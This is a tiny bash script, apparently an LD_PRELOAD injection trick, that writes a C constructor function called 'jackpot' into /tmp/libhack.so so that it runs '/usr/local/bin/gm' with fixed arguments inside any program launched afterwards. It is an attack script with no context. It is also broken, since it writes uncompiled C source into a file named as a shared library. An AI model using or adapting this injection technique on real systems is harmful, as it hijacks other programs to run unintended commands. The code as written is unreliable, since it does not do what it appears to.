#!/bin/bash
echo "void __attribute__((constructor)) jackpot(void) { system(\"/usr/local/bin/gm 9 8 10 24 75 9\"); }" > /tmp/libhack.so
export LD_PRELOAD=/tmp/libhack.so

